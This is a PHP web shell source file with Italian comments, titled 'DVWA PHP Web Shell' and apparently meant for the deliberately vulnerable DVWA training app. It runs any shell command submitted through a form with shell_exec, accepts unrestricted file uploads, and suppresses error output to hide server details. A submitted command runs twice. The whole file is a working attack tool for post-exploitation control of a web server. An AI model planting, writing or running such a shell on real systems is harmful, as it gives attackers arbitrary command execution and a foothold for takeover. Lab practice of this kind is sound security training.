<?php
    // Disabilita errori per evitare rivelazione di informazioni sul server
    error_reporting(0);

    // Funzione per eseguire comandi
    function execute_command($cmd) {
        if (!empty($cmd)) {
            echo "<pre>" . htmlspecialchars(shell_exec($cmd)) . "</pre>";
        } else {
            echo "<pre>Inserisci un comando da eseguire.</pre>";
        }
    }

    // Se viene inviato un comando via POST
    if (isset($_POST['command'])) {
        $command = $_POST['command'];
        execute_command($command);
    }

    // Se viene inviato un file da caricare
    if (isset($_FILES['file'])) {
        $target_path = "uploads/" . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_path)) {
            echo "<pre>File caricato correttamente: " . $target_path . "</pre>";
        } else {
            echo "<pre>Caricamento del file fallito.</pre>";
        }
    }
?>

<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DVWA PHP Web Shell</title>
    <style>
        body {
            background-color: #1e1e1e;
            color: #00ff00;
            font-family: monospace;
        }
        .container {
            max-width: 900px;
            margin: 50px auto;
            padding: 20px;
            background-color: #333;
            border-radius: 10px;
            box-shadow: 0px 0px 20px #00ff00;
        }
        input[type="text"], input[type="file"] {
            width: 80%;
            padding: 10px;
            background-color: #222;
            color: #00ff00;
            border: none;
            border-radius: 5px;
            margin: 10px 0;
        }
        button {
            padding: 10px 20px;
            background-color: #00ff00;
            color: #000;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #00cc00;
        }
        pre {
            background-color: #111;
            padding: 10px;
            border-radius: 5px;
            color: #ffffff;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>DVWA PHP Web Shell 💻</h1>

        <!-- Form per inviare comandi -->
        <form method="post">
            <input type="text" name="command" placeholder="Inserisci un comando shell" autofocus>
            <button type="submit">Esegui Comando</button>
        </form>

        <!-- Form per caricare file -->
        <h3>Carica un file</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit">Carica File</button>
        </form>

        <!-- Output dei comandi -->
        <div>
            <?php
                // Mostra output del comando eseguito o eventuale messaggio
                if (isset($_POST['command'])) {
                    echo "<h3>Output del comando:</h3>";
                    execute_command($_POST['command']);
                }
            ?>
        </div>
    </div>
</body>
</html>
